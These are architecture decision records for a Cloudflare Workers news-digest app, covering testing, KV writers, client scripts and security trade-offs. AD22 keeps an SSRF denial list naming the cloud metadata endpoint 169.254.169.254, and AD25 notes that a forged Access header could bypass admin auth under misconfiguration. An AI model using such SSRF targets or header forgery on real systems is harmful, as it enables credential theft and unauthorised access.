**Context:** Astro 5's `@astrojs/cloudflare` adapter wraps the Worker in its own SSR-aware fetch handler that composes Astro middleware (security headers, view-transition support, asset routing) before delegating to the user-defined cron/queue handlers in `worker.ts`. Vitest cannot load the merged Astro entry because (a) the bundle is produced by `astro build`, which the test pool doesn't run, and (b) the merged file uses Astro-internal module shapes incompatible with `cloudflare:test`. So tests target `worker.ts` directly and exercise the cron/queue surface plus any HTTP routes that `worker.ts` defines inline. Cross-cutting middleware (e.g., the security-headers middleware in `src/middleware/security-headers.ts`) lives in Astro's wrapper and is bypassed in unit tests by construction.

**Alternatives considered:**

- **Force `npm run build` in the test pool setup.** Rejected: doubles CI wall-time on every test run, and the merged module shape is still incompatible with the Workers pool runtime.
- **Hand-roll a Worker entry that composes the Astro middleware in code, used by both prod and tests.** Rejected: mirrors what `@astrojs/cloudflare` already does, churn on every Astro upgrade, no test wins because the middleware is exercised end-to-end via Playwright already.
- **Drop unit tests of cross-cutting middleware entirely.** Rejected: Playwright covers the integration path, but unit tests for individual middleware functions (origin check, rate limit, JWT verify) remain valuable and live in `tests/middleware/`.

**Rationale:** The production middleware chain is verified end-to-end by Playwright (`tests/e2e/csp-violation.spec.ts` and the new `tests/e2e/csp-policy.spec.ts` from D3 below). Unit tests cover middleware functions in isolation. The test/prod entry inversion is acceptable as long as the contract gate stays in Playwright, not in vitest.

**Consequences:**

- New cross-cutting middleware that needs to fire on every response MUST add a Playwright spec exercising it via real `fetch`. A vitest-only test against `worker.ts` will pass while the middleware is silently absent in production.
- The `src/worker.ts` `fetch` branch that exists for the test pool is dead code in production. Mark it with a comment so a future cleanup doesn't delete it on dead-code analysis grounds.
- Astro upgrades that change the wrapper's middleware composition (Astro 6's session-driver factory is the active example) require a Playwright run before merge to confirm middleware still fires.

**Related requirements:** [REQ-OPS-003](../../sdd/observability.md#req-ops-003-security-headers-on-every-response)

---

### AD16: Single-writer invariant for KV `sources:{tag}` enforced via centralised helper

**Status:** Accepted (2026-05-04)

**Decision:** Every write to `sources:{tag}` KV entries goes through `writeSourcesCache` in `src/lib/sources-cache.ts`. The helper canonicalises serialisation (explicit field order: `feeds` then `discovered_at`). The coordinator's eviction read-modify-write recheck uses the helper's `sourcesCacheRawEqual` companion as a strict byte-equality check; the single-writer invariant makes the fast path sufficient.

**Context:** The eviction pass in `applyEvictions` reads `sources:{tag}`, computes a surviving-feeds list, then re-reads the key right before writing to detect a concurrent discovery-cron write. KV has no conditional-put, so the recheck is the only race guard. Before this ADR, the recheck was a raw `latestRaw === raw` byte compare — correct ONLY because the two existing writers (`discovery.ts` success path, `discovery.ts` give-up path, and the coordinator's eviction path) all coincidentally serialised the same `{ feeds, discovered_at }` shape with the same field order via inline `JSON.stringify(...)`. A future writer using a different shape (different field order, additional fields, alternative codec) would have silently clobbered legitimate concurrent writes the recheck was meant to prevent. Same anti-pattern AD7 explicitly migrated away from for chunk-completion tracking.

**Alternatives considered:**

- **Move `sources:{tag}` to D1.** D1's conditional UPDATE+WHERE makes read-modify-write atomic by construction (the AD7 path). Stronger guarantee but a meaningful schema migration; the eviction path is bounded write volume (a few hundred tags × every-4-hour cron) so KV's eventual consistency is acceptable here. Defer; revisit if write volume grows.
- **Per-write monotonic version counter (CAS-style).** Adds a column without strengthening the gate; `discovered_at` already conveys the monotonic signal but is not consulted in the byte-equal recheck because byte-equality already covers the contract. Rejected.
- **Structural-recheck fallback on `discovered_at`.** Initially considered as belt-and-suspenders. Reviewer flagged the failure mode: two writers landing on the same `Date.now()` millisecond with genuinely different feed sets would have been treated as equivalent, silently clobbering one of the writes. The byte path under the single-writer invariant is the right contract.
- **Trust the comment** ("byte-equal compare valid because JSON.stringify is sole writer"). This is what the previous code did. Reviewer churn confirmed comments don't enforce invariants — the invariant is one careless PR away from breaking.

**Rationale:** Centralising the writer is the cheapest way to make the byte-equal invariant load-bearing instead of comment-bearing. Once `writeSourcesCache` is the sole writer with a fixed serialisation, byte-equality is the right race signal: any byte divergence MUST be a different write, and the eviction recheck correctly bails.

**Consequences:**

- New code touching `sources:{tag}` MUST use `writeSourcesCache`. A direct `KV.put('sources:...', ...)` call is a code-review reject.
- The helper exposes a `readSourcesCache` companion with matching shape validation; reading paths should migrate as they're touched (no big-bang rewrite — too much surface, too little risk reduction).
- If the cache value shape ever needs to gain a field, both the helper's `serialize()` field order AND `sourcesCacheRawEqual`'s parse path update in lockstep. The structural recheck's reliance on `discovered_at` is documented inline.
- Future `sources:{tag}` migration to D1 supersedes this ADR. Until then, this is the contract.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence)

---

### AD17: Reject `dedupe-groups.ts` extraction

**Status:** Accepted (2026-05-04)

**Decision:** A prior review batch (PR #168) proposed extracting `normaliseDedupGroups` into a shared `~/lib/dedupe-groups.ts` module — the chunk consumer's variant lacked the within-group dedup that the finalize variant carried. Land the lighter consequence (use the finalize variant's logic in both call sites) without standing up a new module.

**Context:** The chunk consumer ran `normaliseDedupGroups` against LLM-emitted `dedup_groups: number[][]` to canonicalise the groups before clustering. The finalize consumer ran a near-identical helper that additionally ran a Set-based dedup within each group. The prior plan was to extract both into a shared module so both call sites used the stricter logic.

**Alternatives considered:**

- **Land the extraction.** Costs a new module, two import-site updates, and a behaviour change in the chunk consumer (gain within-group dedup). Behaviour change is benign but non-trivial to reason about.
- **No-op the divergence.** The chunk consumer's downstream gating (canonical-URL dedupe + cluster-by-canonical) already removes within-group duplicates before they reach D1, so the missing helper-level dedup is only a redundant-group annotation, not a data correctness issue.

**Rationale:** The chunk consumer's downstream gating makes within-group dedup at the helper level redundant. Spending review velocity on the extraction would yield a non-observable behaviour change. Recorded as an explicit decision so the next reviewer doesn't replay the proposal.

**Consequences:**

- The chunk consumer's `normaliseDedupGroups` stays as-is, slightly looser than the finalize variant. This is documented in the chunk consumer's source comment.
- If future canonical-URL dedup is loosened (e.g., a feature lets two canonical URLs survive within one cluster), revisit this decision and land the extraction.

**Related requirements:** [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-processing-with-json-output-contract), [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass)

---

### AD18: Reject `deferred-candidates.ts`; chunk-overflow path stays log-only

**Status:** Accepted (2026-05-04)

**Decision:** When a coordinator tick produces more chunk candidates than `MAX_CHUNKS_PER_TICK`, the overflow is dropped with a `coordinator.candidates_dropped` log event. A prior review batch proposed persisting overflow candidates to a `deferred:{scrape_run_id}` KV row and re-merging them on the next tick. Defer indefinitely.

**Context:** `MAX_CHUNKS_PER_TICK` caps the number of chunks one coordinator tick can fan out, primarily to keep the per-tick LLM cost bounded. Today the cap is comfortable headroom (current observed peak is well under the cap). The "persist + re-merge" plan was speculative — protecting a failure mode that hasn't been observed in production.

**Alternatives considered:**

- **Persist overflow to KV with TTL.** Adds a new KV key prefix, a re-merge path on next tick, and an observability story for "deferred candidate fell out before re-merge". Worth implementing IF and WHEN the drop log fires non-trivially.
- **Raise `MAX_CHUNKS_PER_TICK`.** Trades drop frequency for tick wall-clock time and LLM cost. Same outcome long-term once observed.

**Rationale:** A speculative persistence layer is the wrong direction; until the drop log shows a real problem, the simpler path is to keep the cap and revisit the cap value (not the persistence story) when observability says we're truncating real candidates.

**Consequences:**

- `coordinator.candidates_dropped` event continues to surface drops in `wrangler tail`. Operators monitor this signal; if drops become sustained, raise the cap or implement the persistence layer at that point.
- This ADR documents WHY a `deferred-candidates.ts` module does not exist, so the next reviewer doesn't replay the proposal.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence)

---

### AD19: Reject `tag-railing-flip-core.ts`; FLIP measurements are not separable from DOM

**Status:** Accepted (2026-05-04)

**Decision:** A prior review batch proposed extracting the FLIP-cascade kernel from `src/lib/tag-railing-flip.ts` into a DOM-free `tag-railing-flip-core.ts` module so the math could be unit-tested in vitest. The math is genuinely intertwined with DOM measurement timing (`getBoundingClientRect` ordering, requestAnimationFrame phase, cascade staggering) and a pure-math kernel would only test the trivial parts. Tests live in Playwright E2E instead.

**Context:** FLIP (First-Last-Invert-Play) animations measure DOM rectangles before and after a layout-affecting mutation, then transform-translate the affected elements to their pre-layout positions and animate them back. The "math" is per-element delta computation; the load-bearing logic is the order in which measurements happen relative to the DOM mutation, the cascade stagger between sibling chips, and the lock-state transitions that prevent overlapping animations from clobbering each other. None of this is meaningfully testable without a real layout engine.

**Alternatives considered:**

- **Extract a kernel anyway.** Would test trivial deltas and miss the actual failure modes. False confidence.
- **Use a JSDOM-based vitest test pool.** JSDOM doesn't run a real layout engine; `getBoundingClientRect` returns zero. Same problem.
- **Keep behaviour in `tag-railing-flip.ts`, add Playwright spec that asserts the user-observable contract (lock clears, scrollLeft preserved, no CSP violations).** This is what `tests/e2e/tag-railing-flip.spec.ts` does (added in Phase F).

**Rationale:** The contract is "the chip cascade looks right and doesn't break under view-transitions or PWA scroll restoration." That's an end-to-end contract, not a kernel contract.

**Consequences:**

- `src/lib/tag-railing-flip.ts` stays as-is; the `?raw`-source-grep tests it spawned are deleted in Phase F (CF-011) and replaced by the Playwright spec.
- This ADR documents WHY a `tag-railing-flip-core.ts` module does not exist.

**Related requirements:** [REQ-READ-007](../../sdd/reading.md#req-read-007-tag-railing-cascade-on-toggle-and-add)

---

### AD20: Idempotency tokens for client scripts loaded BOTH as Pattern B IIFE AND via page-level import must live on `window`

**Status:** Accepted (2026-05-04)
**Overrides:** none — captures a regression-class so future review passes don't reintroduce it.

**Context:** Client scripts under `src/scripts/*.ts` ship two ways:

- **Pattern B** — compiled by `scripts/build-client-scripts.mjs` into a self-contained IIFE bundle at `public/scripts/<name>.js`, loaded layout-wide by a `<script type="module" src="/scripts/<name>.js">` tag in `src/layouts/Base.astro`. CSP `script-src 'self'` requires self-hosted modules; an inline `<script>` would be CSP-blocked.
- **Pattern A** — placed under `src/scripts/bundled/` and imported by an Astro component or page; Vite/Astro bundles them into a hashed `_astro/*.js` chunk per page that uses them.

`src/scripts/card-interactions.ts` is exclusively Pattern B (lives at the top level of `src/scripts/`, NOT under `bundled/`). However `src/pages/history.astro` ALSO statically imports `initCardInteractions` from this file so the page can re-bind tag-disclosure click handlers on cards CLONED into the search-filter grid (the layout-wide IIFE only fires on `astro:page-load`, not after JS-driven clone insertion). That static import causes Vite to bundle the *entire* module — including the auto-wire IIFE at the bottom — into history.astro's chunk. The result is **two independent module evaluations** of the same source on /history:

1. The standalone IIFE (Pattern B build) runs on script-tag load.
2. The Astro-bundled copy runs when history.astro's chunk evaluates.

Each evaluation has its own module-scope closure. Each closure has its own `let starDelegationBound = false`. Each registers its own `document.addEventListener('click', …)`. Two listeners fire per star click: the first flips `aria-pressed` and POSTs; the second sees the already-flipped state and DELETEs. Net effect: every favourite toggle silently reverts. The duplicate listener also persists on `document` across view-transitions, which is why the article-detail page's star button is broken when navigated FROM /history but works when navigated from /digest (whose pages don't import this module).

PRs #182, #184, and #185 all attacked this surface and missed the dual-bundle dimension:

- PR #182 stored the idempotency flag on `documentElement.dataset` — view-transition wipes it.
- PR #184 moved the flag into module-scope closure — only deduplicates within ONE module instance.
- PR #185 added a regression test for the documentElement-swap case but couldn't catch the cross-instance case because vitest evaluates the module once.

**Decision:** Idempotency tokens for any client script that is loaded both as Pattern B AND imported page-level MUST live on `window` — the realm-scoped global is the same object across both module evaluations. Module-scope closure variables and DOM-node datasets are insufficient. The pattern looks like:

```ts
declare global {
  // eslint-disable-next-line no-var
  var __cardInteractionsBound: { star?: true; outsideClick?: true } | undefined;
}
function getBindFlags() {
  if (typeof window === 'undefined') return {};
  if (window.__cardInteractionsBound === undefined) {
    window.__cardInteractionsBound = {};
  }
  return window.__cardInteractionsBound;
}
```

**Alternatives considered:**

- **Strip the page-level import; rely solely on the layout-wide auto-wire.** Would close the dual-bundle hole but also strip the page's ability to rebind clones synchronously after filter actions. Possible but requires either (a) exposing `initCardInteractions` on `window` from the IIFE and calling it via `window.__cardInteractions.init(searchGrid)` in history.astro, or (b) letting history.astro fire a custom event that the IIFE listens for. Both are larger refactors.
- **Move the auto-wire IIFE OUT of `card-interactions.ts` into `card-interactions-bootstrap.ts`.** Then the page-level import would only pull pure functions (no side-effect IIFE). Cleaner architecturally but ties Pattern B-vs-Pattern A to a file-naming convention, and any future page-level importer who imports the bootstrap by mistake re-introduces the bug.
- **`window`-scoped token (chosen).** Smallest diff, strongest guarantee, works regardless of how many copies of the module run.

**Consequences:**

- All future `src/scripts/*.ts` files that need to register global listeners AND might be imported by a page MUST use the window-scoped token pattern. The closure-flag pattern is a foot-gun.
- `scripts/check-no-page-pattern-b.mjs` is added as a CI gate (run via `node scripts/check-no-page-pattern-b.mjs` in `.github/workflows/test.yml`): it scans `src/pages/**/*.astro` and `src/components/**/*.astro` for static imports of any top-level `src/scripts/*.ts` (i.e. NOT `src/scripts/bundled/*`). Any such import fails the build with a pointer to this ADR. Future contributors who want to import a script from a page must move it under `src/scripts/bundled/`.
- The `__resetForTests` helper in `card-interactions.ts` clears `window.__cardInteractionsBound` instead of closure variables.

**Related requirements:** [REQ-STAR-001](../../sdd/reading.md#req-star-001), [REQ-READ-001](../../sdd/reading.md#req-read-001)

---

### AD21: Drop-cap vertical alignment is not portable across non-Charter serif fallbacks

**Status:** Accepted (2026-05-04)

**Context:** `src/pages/digest/[id]/[slug].astro` styles the article's lead paragraph with a `::first-letter` drop cap. The math (font-size 3.6em, line-height 1, margin-bottom -0.34em) was tuned for Charter — the preferred serif on Apple platforms — assuming an ascent ratio of ~0.78 and a cap-height ratio of ~0.66. On Linux and Windows, the `--font-serif` stack falls back to Source Serif Pro, Noto Serif, Cambria, or Times New Roman, which carry different metrics; the cap renders ~0.3em below where the math placed it.

PR #185 attempted to compensate with `margin-top: -0.3em`. The user reported this pulled the cap visibly above line 1's cap-top on the rendering platform and collided with line 2's leading. Reverted to `margin-top: 0` in PR #186.

**Decision:** Accept that the drop cap renders correctly on Charter (Apple) and acceptably (slightly below ideal cap-top) on the other fallbacks. Do NOT attempt CSS-only compensation; the metrics differ too much across fonts. A future improvement can detect the loaded font via `document.fonts.check('1em Charter')` and toggle a CSS variable for per-font tuning, but that is a feature, not a bug fix.

**Alternatives considered:**

- **Static `margin-top` value** — what PR #185 tried. Either fixes Charter at the cost of non-Charter, or vice versa. No single value works.
- **Use `initial-letter` CSS property** — comment in source notes that initial-letter has bug-prone implementations across browsers (Samsung Browser float-above-line-1 bug, etc.) and was deliberately abandoned in favour of float-based math.
- **Per-font CSS variable, set via JS feature-detect.** Correct long-term answer; out of scope for a bug-fix.

**Consequences:**

- Drop-cap looks slightly low on Linux/Windows browsers; this is the accepted state.
- The CSS comment block in `[slug].astro` notes the trap so the next reviewer doesn't try the same `margin-top` adjustment again.

**Related requirements:** [REQ-READ-002](../../sdd/reading.md#req-read-002)

---

### AD22: SSRF defence relies on Workers network sandbox; static IP allowlist is best-effort only

**Status:** Accepted (2026-05-05)

**Decision:** Accept the residual DNS-rebinding risk in the server-side article-body fetch path. Rely on the Cloudflare Workers network sandbox, which already blocks the meaningful exfiltration paths (private IP ranges, link-local, metadata endpoints) at the platform layer. Maintain the static hostname/IP denial list (including `metadata` and `169.254.169.254` literals) as defence in depth.

**Context:** `isUrlSafe()` in `src/lib/ssrf.ts` performs a static hostname/IP-literal check at request time. Between this check and the actual fetch, DNS resolution can flip (DNS rebinding) so that a hostname which passed validation later resolves to a private/loopback address. The Workers runtime, however, does not provide hooks to pin the resolved IP across the validation→fetch boundary. A bareword `metadata` hostname (no dot) is also not currently blocked by the existing literal list.

**Alternatives considered:**
- **Resolution pinning at the platform layer.** Would close the rebinding window entirely; not exposed by the Workers runtime today.
- **Outbound proxy with a curated egress allowlist.** Hard pin, but trades the SSRF surface for an availability dependency on the proxy, plus operational complexity that does not match the threat model.
- **Drop the static check entirely and rely solely on the platform sandbox.** Loses the defence-in-depth signal that a request asked for `169.254.169.254` literally — useful in logs even if the platform would have blocked the fetch anyway.

**Rationale:** Workers runtime sandbox already blocks the meaningful exfiltration paths. A static IP allowlist is best-effort defence-in-depth only; full DNS-rebinding mitigation requires runtime resolution pinning that the Workers platform does not expose. The cost of building a partial mitigation (e.g., a fetch wrapper that re-resolves immediately before fetch) does not justify the marginal risk reduction given the platform-level guarantees.

**Consequences:**
- SSRF defence is layered (static check + platform sandbox) rather than fully resolution-pinned.
- If Cloudflare ever loosens the runtime sandbox (e.g., allows outbound connections to RFC1918 ranges from a Worker), this decision MUST be revisited — the static check alone is not sufficient.
- Documented residual risk surfaces in `sdd/security.md` (or the equivalent threat-model doc when bootstrapped).
- The `metadata` bareword and any future single-label hostnames that resolve to sensitive infrastructure should be added to the literal denial list as they surface.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence) AC 8

---

### AD23: Auth-rate-limit fail-closed without WAF backstop

**Status:** Accepted (2026-05-05)

**Decision:** KV-backed auth rate limits (AUTH_LOGIN, AUTH_CALLBACK in `src/lib/rate-limit.ts`) fail CLOSED (`failClosed: true`) on KV error — auth requests are denied during a KV outage rather than admitted unrestricted. The Cloudflare WAF zone-level backstop is deliberately OUT OF SCOPE for this iteration.

**Context:** AUTH_LOGIN (10/min/IP) and AUTH_CALLBACK (20/min/IP) rate limits are enforced via KV counters. Two design choices arose: (a) what to do when KV itself is unavailable, and (b) whether to add a Cloudflare WAF zone-level backstop independent of KV. A WAF zone-level rate limit would be a hardware-layer backstop independent of KV.

**Alternatives considered:**
- **Fail-open on KV error.** Previous behaviour. Removes the auth rate limit on the OAuth code-exchange path during a KV outage — unacceptable given the brute-force exposure window.
- **Add a Cloudflare WAF zone-level rate-limit backstop in addition to fail-closed KV.** Stronger defence in depth; rejected for this iteration on cost/operational grounds (WAF rule maintenance, per-zone configuration drift across environments).
- **Move rate-limit counters to D1.** Stronger consistency than KV but introduces D1 write pressure on every auth request. Rejected as disproportionate to the threat.

**Rationale:** A WAF zone-level rate limit would be a hardware-layer backstop independent of KV. It is deliberately out of scope for this iteration: the cost/operational complexity of maintaining WAF rules is judged higher than the residual risk of relying solely on the KV-backed limit (which now fails closed). Failing closed during KV outages is preferred over silent removal of brute-force protection.

**Consequences:**
- Brief KV outages may surface as auth-login 429s for end users — preferred over silent removal of brute-force protection.
- No WAF rules are maintained, so the entire auth-throttle contract depends on the worker reaching KV. If a future incident shows this failure mode is operationally unacceptable, revisit by adding the WAF layer.
- The fail-closed flag is set per-rate-limiter and is auditable in source — any new rate limit added to the auth path SHOULD inherit `failClosed: true` and reference this ADR.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider), [REQ-AUTH-003](../../sdd/authentication.md#req-auth-003-csrf-defense-for-state-changing-endpoints)

---

### AD24: Single OAUTH_JWT_SECRET for both session signing and CSRF state

**Status:** Accepted (2026-05-05)

**Decision:** Deliberately reuse `OAUTH_JWT_SECRET` for both session JWT signing and CSRF-state HMAC. Do not derive a separate sub-key via HKDF. Both consumers run inside the same trust boundary; the threat model does not include attacks that disclose one purpose's key without the other.

**Context:** `verifyHmacSignature` (renamed from `timingSafeEqualHmac` in CF-014) in `src/lib/crypto.ts` is used for CSRF-state validation in OAuth callback handling (`src/pages/api/auth/[provider]/callback.ts:232`, `src/pages/api/dev/login.ts:70`, `src/pages/api/dev/trigger-scrape.ts:59`) and reuses `OAUTH_JWT_SECRET` — the same key that signs session JWTs. Standard cryptographic guidance is to derive distinct sub-keys per purpose via HKDF.

**Alternatives considered:**
- **HKDF-derive a separate sub-key per purpose** (`OAUTH_JWT_SECRET` → `session-signing-key` and `csrf-state-key` via HKDF-SHA256 with distinct `info` strings). Strict cryptographic best practice; rejected because the threat model does not justify the operational surface (key-derivation code path, cache, rotation semantics).
- **Introduce a separate `CSRF_STATE_SECRET` env var.** Doubles the rotation surface for the same trust boundary. Rejected.
- **Leave the API as-is and document only.** What was previously implicit. Rejected because the next reviewer reaches for HKDF-derive without reading this rationale.

**Rationale:** Both consumers run inside the same trust boundary (the worker) and the threat model does not include partial-secret-disclosure attacks where a session-signing key leaks but the CSRF-state key does not. Avoiding HKDF derivation keeps the key-management surface to a single rotated secret. Operational simplicity (one secret to rotate) outweighs the textbook key-separation principle given this threat model.

**Consequences:**
- Single secret to rotate (operational simplicity).
- If a future threat model surfaces (e.g., a side-channel that leaks the CSRF-state HMAC computation but not the JWT signing path, or a partial-disclosure crypto bug in the underlying primitive), this decision must be revisited and a HKDF-derived sub-key introduced.
- The `verifyHmacSignature` rename (from `timingSafeEqualHmac`) was the CF-014 cleanup — the function is constant-time string equality via HMAC, symmetric in result for both arguments. The rename plus a `(expected, candidate, secret)` argument convention removes the misleading "argument-order is load-bearing" framing of the prior name. Orthogonal to the key-reuse decision recorded here.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider), [REQ-AUTH-003](../../sdd/authentication.md#req-auth-003-csrf-defense-for-state-changing-endpoints)

---

### AD25: Cloudflare Access JWT signature unverified server-side; trust Access edge

**Status:** Superseded by AD29 (2026-05-05)

**Decision:** Rely on the platform guarantee that requests reaching the worker have already passed Cloudflare Access verification when `CF_ACCESS_AUD` is set. Skip in-worker JWT signature validation in `decodeAccessJwt` (`src/middleware/admin-auth.ts:49-68`).

**Context:** Admin endpoints are protected by Cloudflare Access. Requests arriving at the worker carry a `Cf-Access-Jwt-Assertion` header. The worker's `decodeAccessJwt` parses claims (`sub`, `email`, `aud`) without verifying the signature. Cloudflare Access verifies the JWT at the edge before requests reach the worker; re-verifying inside the worker (e.g., via JWKS) duplicates work without changing the security posture, provided the worker is properly bound to a custom domain with `workers_dev = false` and `CF_ACCESS_AUD` configured.

**Alternatives considered:**
- **JWKS-based signature verification inside the worker.** Strict defence-in-depth; requires fetching/caching Cloudflare's JWKS, periodic refresh, and key-rotation handling. Rejected as duplicative of the edge verification.
- **Drop the `aud` check and rely entirely on the edge.** Loses the audience-binding signal that catches misconfigured deployments where Access is bound to a different application. Rejected — the `aud` check is a cheap deployment-misconfiguration tripwire even without signature verification.
- **Verify signature only when `CF_ACCESS_AUD` is unset (fail-loud configuration error).** More complex than just refusing to start; rejected in favour of treating `CF_ACCESS_AUD` as a hard deployment requirement.

**Rationale:** Cloudflare Access verifies the JWT at the edge before requests reach the worker. Re-verifying inside the worker (e.g., via JWKS) duplicates work without changing the security posture, provided the worker is properly bound to a custom domain with `workers_dev = false` and `CF_ACCESS_AUD` configured. The deployment configuration itself is the security boundary — the alternative (in-worker JWKS verification) does not strengthen the posture if the deployment is correct, and does not save the deployment if it is misconfigured (an attacker reaching `*.workers.dev` directly would also have a fresh JWT-forging window if the audience check is the only gate).

**Consequences:**
- Operational deployment checklist must include: `CF_ACCESS_AUD` is set, `workers_dev = false`, and the Access policy is bound to the custom domain.
- If `*.workers.dev` is ever re-enabled, or `CF_ACCESS_AUD` is unset, an attacker could forge the header and bypass admin auth — making the deployment configuration itself a security boundary.
- `documentation/deployment.md` (or the equivalent runbook) MUST document the `workers_dev = false` + `CF_ACCESS_AUD` requirement as a hard precondition for production rollout.
- Future hardening could add JWKS-based verification as defence in depth; revisit if the deployment-configuration boundary proves operationally fragile (e.g., a rollback accidentally re-enables `*.workers.dev`).

**Related requirements:** [REQ-OPS-006](../../sdd/observability.md#req-ops-006-integration-deployment-target)

---

### AD26: REQUIREMENTS.md preserved as historical artefact

**Status:** Accepted (2026-05-05)

**Decision:** Do NOT delete `REQUIREMENTS.md` at the project root. Preserve it as a snapshot of the project's original intent. Keep it out of the active doc graph (no cross-references from `documentation/` or `sdd/`) but available at the repo root for historical reference.

**Context:** `REQUIREMENTS.md` at the project root predates the SDD bootstrap and describes an earlier product direction (per-user digest, GitHub-only auth, user-selectable model). The current spec lives in `sdd/`. The file's self-deprecating header acknowledges its stale status but the content is otherwise intact.

**Alternatives considered:**
- **Delete the file.** Loses the snapshot of the project's original direction; git history preserves it but root-level discoverability is gone for newcomers reviewing the repo's evolution.
- **Merge into `sdd/README.md` "Out of Scope" section.** Would dilute the active spec with content that no longer maps to active REQs and forces a structural reframing of historical prose into REQ-ish bullets.
- **Move to `documentation/history/REQUIREMENTS.md`.** Reasonable, but couples a historical snapshot to the active doc tree and risks doc-discipline budget enforcement firing on prose that is intentionally frozen.

**Rationale:** Preserve as a historical artefact of the project's original direction. Deletion would lose the snapshot; merging into `sdd/README.md` "Out of Scope" would dilute the spec with content that no longer maps to active REQs. Keeping it at the repo root, out of the active doc graph, gives newcomers a discoverable artefact while preventing it from contaminating the live spec or doc-discipline checks.

**Consequences:**
- Repo root carries one informational file that newcomers may discover and need context for. The self-deprecating header on the file itself plus this AD provide that context.
- The file is NOT auto-updated, NOT linked from indexes, and is excluded from doc-discipline budget checks.
- If a future contributor proposes "cleaning up" the root by deleting `REQUIREMENTS.md`, this ADR is the artefact that records the decision to keep it.

**Related requirements:** none (historical artefact, no active REQ binding).

---

### AD27: All KV writers route through `src/lib/kv/<family>.ts` helpers

**Status:** Accepted (2026-05-05)

**Decision:** Every KV writer for a multi-site key family lives in a dedicated helper file under `src/lib/kv/<family>.ts`. Inline `env.KV.put(...)` or `env.KV.delete(...)` calls from queue handlers, page routes, or other lib files are prohibited when the key family has more than one call site.

**Context:** AD16 introduced the single-writer invariant for `sources:{tag}` only (centralised in `src/lib/sources-cache.ts`). Other KV key families had the same problem: inline writers scattered across multiple files with no shared key-format definition. The affected families at the time of this decision were:

- `scrape_run:{id}:chunks_remaining` — written from both the coordinator and the chunk consumer.
- `discovery_failures:{tag}` — written (put + delete) from `discovery.ts`, `cleanup.ts`, and two admin retry routes.

The `source_health:{url}` family was already centralised in `src/lib/feed-health.ts`, `headlines:{source}:{tag}` in `src/lib/headline-cache.ts`, and rate-limit keys in `src/lib/rate-limit.ts`. Single-call-site readers (e.g., `/api/scrape-status` reading `chunks_remaining`) remain inline — the invariant targets writers and multi-site families only.

**Alternatives considered:**

- **Keep inline writes.** Rejected — same drift class as the `sources:{tag}` race documented in AD16. Multiple writers with no shared key-format definition lead to key-format inconsistencies and make it impossible to audit who mutates a given key family.
- **Abstract via a single `KvRepository<T>` base class.** Rejected — over-abstracts for thin wrappers that each contain a single `kv.put` / `kv.get` / `kv.delete` call. The generic base class buys nothing except indirection.

**Consequences:**

- New KV key families with more than one writer MUST add a `src/lib/kv/<family>.ts` helper before the first writer lands. Code review should flag inline `env.KV.put(...)` writes outside `src/lib/kv/` or the pre-existing centralised files.
- Single-call-site reads (e.g., `scrape-status.ts` reading `chunks_remaining`) may remain inline — the invariant is about multi-site writers, not all KV access.
- Existing files `src/lib/feed-health.ts`, `src/lib/headline-cache.ts`, `src/lib/sources-cache.ts`, and `src/lib/rate-limit.ts` are already compliant; they predate this ADR and serve the same pattern.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence), [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-source-discovery-for-per-tag-feeds)

---

### AD28: npm audit gating split — HIGH advisory, CRITICAL blocking

**Status:** Accepted (2026-05-05)
**Overrides:** spec-finding:CF-048

**Decision:** The CI `npm audit` step runs at TWO levels: HIGH+ as advisory (`continue-on-error: true`), CRITICAL+ as blocking. Do NOT tighten HIGH+ to blocking without first confirming none of the flagged transitives reach the workerd runtime.

**Context:** CF-048 originally proposed tightening the gate to HIGH+ blocking on the production-dep tree (`npm audit --omit=dev --audit-level=high`). The first push that landed the tightening tripped on transitive CVEs in `undici` (pulled by `@astrojs/cloudflare` -> `miniflare` -> `wrangler`). Those transitives are build/dev-time tooling: they ship in `node_modules` but never reach the deployed Workers bundle, which runs on workerd's own fetch implementation. Blocking HIGH would force every PR to wait on Dependabot major-version bumps with breaking-change risk, while delivering no production-runtime risk reduction.

**Alternatives considered:**

- **HIGH+ blocking (the original CF-048 proposal).** Rejected — see Context. Blocks unrelated PRs on transitive build-tool CVEs.
- **HIGH+ blocking with an `npm overrides` allowlist.** Rejected — `npm audit` does not honour package overrides as exclusions; the tooling does not support a clean "ignore these transitives" path.
- **Migrate to a different audit tool (Snyk, Dependabot CLI, etc.).** Rejected for now — npm audit is good enough at the current scale; the dual-level split surfaces the data without over-engineering.

**Rationale:** Workers runtime exposure is what matters; the workerd binary does not include `undici`/`miniflare`/`wrangler`. Surfacing HIGH advisories in CI logs lets operators triage the Dependabot channel without coupling unrelated PR merges to dependency major-version bumps. CRITICAL blocking remains the red line.

**Consequences:**

- HIGH+ npm-audit findings are visible in every CI run but do not block merges. Operators are expected to engage Dependabot PRs as the resolution channel.
- Future CRITICAL CVEs on the production-runtime path WILL block. The threshold is calibrated for runtime exposure, not headline severity.
- Re-tightening HIGH+ to blocking requires either (a) eliminating all transitive build-tool CVEs from the dep tree, OR (b) adopting a tool with finer-grained scoping than `npm audit`.

**Related requirements:** none (operational policy; no REQ binding).

---

### AD29: Cloudflare Access is opt-in additive perimeter; ADMIN_EMAIL gates admin alone

**Status:** Accepted (2026-05-05)
**Supersedes:** AD25
**Overrides:** behavioral-policy:REQ-AUTH-001

